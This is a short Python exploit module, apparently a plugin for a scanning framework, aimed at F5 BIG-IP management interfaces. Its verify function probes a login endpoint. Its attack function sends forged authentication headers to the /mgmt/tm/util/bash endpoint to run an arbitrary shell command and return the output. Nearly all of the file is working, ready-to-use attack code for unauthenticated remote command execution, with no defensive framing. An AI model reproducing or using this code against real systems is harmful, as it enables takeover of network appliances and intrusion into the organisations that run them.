#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2022/5/10
# refer:https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q
# -iS https://1.1.1.1 -s f5 -m attack -param id
import requests
import json

def verify(target_node):
    target = target_node['target']
    url =  target.rstrip("/") + "/mgmt/shared/authn/login"
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'}
    try :
        sess = requests.session()
        sess.headers = headers
        r = sess.get(url,headers=headers,verify = False)
        flag = 'resterrorresponse'
        if flag in r.text:
            res['info'] = url
            res['Success'] = True

    except Exception as e:
        res['Info'] = e
        res['Success'] = False
    return res


def attack(target_node):
    res = {}
    res['Info'] = ""
    res['Success'] = False
    target = target_node['target']
    param =  target_node['param']
    url = target + "/mgmt/tm/util/bash"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'a',
        'Authorization': 'Basic YWRtaW46'
    }
    data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(param)}
    try :
        sess = requests.session()
        sess.headers = headers
        r = sess.post(url, json=data,verify=False,headers=headers)
        text = r.text
        if r.status_code == 200 and 'commandResult' in text:
            json_txt = json.loads(text)
            display = json_txt['commandResult']
            res['Info'] =display
            res['Success'] = True
    except Exception as e:
        res['Info'] = e
        res['Success'] = False
    return res